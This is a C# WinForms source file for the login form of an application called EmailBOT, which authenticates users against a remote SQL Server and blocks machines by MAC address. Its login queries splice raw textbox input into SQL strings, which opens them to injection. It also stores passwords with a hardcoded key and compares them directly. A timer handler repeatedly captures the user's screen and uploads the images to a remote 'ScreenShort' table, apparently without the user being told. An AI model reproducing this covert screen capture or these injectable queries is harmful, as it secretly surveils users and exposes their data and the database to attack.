using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Device.Location;
using System.Net;
using EmailBOT.Properties;
using EmailBOT.Tasks;
using EmailBOT.Class;
using System.Data.SqlClient;
using System.IO;
using System.Drawing.Imaging;
using System.Threading;

namespace EmailBOT
{
    public partial class Login : Form
    {
        #region //Border shadow and moving by mouse


        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private bool Drag;
        private int MouseX;
        private int MouseY;

        private const int WM_NCHITTEST = 0x84;
        private const int HTCLIENT = 0x1;
        private const int HTCAPTION = 0x2;

        private bool m_aeroEnabled;

        private const int CS_DROPSHADOW = 0x00020000;
        private const int WM_NCPAINT = 0x0085;
        private const int WM_ACTIVATEAPP = 0x001C;

        [System.Runtime.InteropServices.DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);
        [System.Runtime.InteropServices.DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
        [System.Runtime.InteropServices.DllImport("dwmapi.dll")]

        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);
        [System.Runtime.InteropServices.DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse
            );

        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }
        protected override CreateParams CreateParams
        {
            get
            {
                m_aeroEnabled = CheckAeroEnabled();
                CreateParams cp = base.CreateParams;
                if (!m_aeroEnabled)
                    cp.ClassStyle |= CS_DROPSHADOW; return cp;
            }
        }
        private bool CheckAeroEnabled()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                int enabled = 0; DwmIsCompositionEnabled(ref enabled);
                return (enabled == 1) ? true : false;
            }
            return false;
        }
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_NCPAINT:
                    if (m_aeroEnabled)
                    {
                        var v = 2;
                        DwmSetWindowAttribute(this.Handle, 2, ref v, 4);
                        MARGINS margins = new MARGINS()
                        {
                            bottomHeight = 1,
                            leftWidth = 0,
                            rightWidth = 0,
                            topHeight = 0
                        }; DwmExtendFrameIntoClientArea(this.Handle, ref margins);
                    }
                    break;
                default: break;
            }
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST && (int)m.Result == HTCLIENT) m.Result = (IntPtr)HTCAPTION;
        }
        private void PanelMove_MouseDown(object sender, MouseEventArgs e)
        {
            Drag = true;
            MouseX = Cursor.Position.X - this.Left;
            MouseY = Cursor.Position.Y - this.Top;
        }
        private void PanelMove_MouseMove(object sender, MouseEventArgs e)
        {
            if (Drag)
            {
                this.Top = Cursor.Position.Y - MouseY;
                this.Left = Cursor.Position.X - MouseX;
            }
        }
        private void PanelMove_MouseUp(object sender, MouseEventArgs e) { Drag = false; }
        #endregion 
        public Login()
        {
            InitializeComponent();
            try
            {
                lblVersion.Text = "Version: "+BaseClass.version;
                string uid = Properties.Settings.Default.Userid;
                string pw = Properties.Settings.Default.Password;
                txtEmailId.Text = uid;
                if (pw != "")
                {
                    txtPassword.Text = BaseClass.Decrypt(pw, "pass#");
                    chkRemember.Checked = true;
                } 
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }
        private string MacAddress()
        {
            try
            {
                var macAddr =
        (
            from nic in NetworkInterface.GetAllNetworkInterfaces()
            where nic.OperationalStatus == OperationalStatus.Up
            select nic.GetPhysicalAddress().ToString()
        ).FirstOrDefault();
                return macAddr;

            }
            catch
            {
                return "";
            }
        }
        private void btnLogin_Click(object sender, EventArgs e)
        {
            string uniqueId = MacAddress();
            string checkBlock = BaseClass.GetData($"Select UUID from BlockAddress where UUID='{uniqueId}'");
            if(checkBlock!="")
            {
                MessageBox.Show("Invalid User Account");
                    return;
            }
            var data = BaseClass.DataReaderAdd($"Select Id,Name,LoginPass from Registration where Email='{txtEmailId.Text}' and status=1 and AppVersion='{BaseClass.version}'",Connection.OnlineConnection);
            if (data.Count > 0)
            {
                BaseClass.uniqueId = uniqueId;
                BaseClass.UserId= data[0];
                BaseClass.name = data[1];
                string password =data[2]; 
                string userPassword= BaseClass.Encrypt(txtPassword.Text, "pass#");
                if (password == txtPassword.Text)
                {
                    // insert log
                    BaseClass.Execute($"insert into log (MacAddress,ExecuteTime,UserId) values ('{uniqueId}','{DateTime.Now}','{data[0]}')", Connection.OnlineConnection);
                    Properties.Settings.Default.Userid = txtEmailId.Text;
                    Properties.Settings.Default.Password = BaseClass.Encrypt(txtPassword.Text, "pass#");
                    Properties.Settings.Default.Save();
                    Invoke(new Action(() =>
                    {
                        lblMsg.Text = "";
                    }));
                    CheckValidUser(); 
                }
                else
                {
                    lblMsg.Text = "Password wrong.";
                    txtPassword.Focus();
                }
            }
        } 
        private void lblClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
        private void CheckValidUser()
        {
            string checkBlock = BaseClass.GetData($"Select UUID from BlockAddress where UUID='{ BaseClass.uniqueId }'", Connection.OnlineConnection);
            //BaseClass.CheckUserValidation();// check key is valid or not 
            if (checkBlock != "")
            {
                MessageBox.Show("Error: Access permission has invalid or expired. Please re-authenticate", "Invalid permission", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                Invoke(new Action(() =>
                {
                    this.Close();
                    new Login().Show();
                }));

            }
            else
            {
                new MultiTask().Show();
                this.Hide();
            }
        }
        int process = 0;
        int screenWidth = 1024;
        int screenHeight = 768;
        Thread th = null;
        private void sssTimer_Tick(object sender, EventArgs e)
        {
            if (process == 0)
            {
                th = new Thread(new ThreadStart(CaptureMyScreen));
                th.Start();
            }
        }
        private void CaptureMyScreen()
        {
            try
            {
                process = 1;
                //Creating a new Bitmap object
                using (Bitmap captureBitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb))
                {
                    //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                    //Creating a Rectangle object which will
                    //capture our Current Screen
                    Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                    //Creating a New Graphics Object
                    Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                    //Copying Image from The Screen
                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                    //Saving the Image File (I am here Saving it in My E drive).
                    //captureBitmap.Save(path + "Capture.jpg", ImageFormat.Jpeg);
                    //save to database
                    System.IO.MemoryStream ms = new MemoryStream();
                    captureBitmap.Save(ms, ImageFormat.Jpeg);
                    byte[] byteImage = ms.ToArray();
                    var SigBase64 = Convert.ToBase64String(byteImage);
                    InsertScreenShort(SigBase64);
                    process = 0;
                    th.Abort();
                }
            }
            catch (Exception ex)
            {
                process = 0;
                //MessageBox.Show(ex.Message);
            }
        }

        internal bool InsertScreenShort(string imageStr)
        {
            bool result = false;
            SqlTransaction transaction = null;
            try
            {
                using (SqlConnection con = new SqlConnection(Connection.OnlineConnection))
                {
                    using (SqlCommand cmd = new SqlCommand("", con))
                    {
                        if (con.State != ConnectionState.Open)
                            con.Open();
                        transaction = con.BeginTransaction();
                        cmd.CommandType = CommandType.Text;
                        cmd.CommandText = @"Insert into ScreenShort (ExecuteTime,Images,UserId) values (@ExecuteTime,@Images,@UserId)";
                        cmd.Parameters.Clear();
                        cmd.Parameters.AddWithValue("@ExecuteTime", DateTime.Now);
                        cmd.Parameters.AddWithValue("@Images", imageStr);
                        cmd.Parameters.AddWithValue("@UserId", BaseClass.UserId);
                        cmd.Transaction = transaction;
                        cmd.ExecuteNonQuery();
                        transaction.Commit();
                        result = true;
                        if (con.State != ConnectionState.Closed)
                            con.Close();
                    }
                }

            }
            catch (Exception ex)
            {
                transaction.Rollback();
            }
            return result;
        }
    }
}
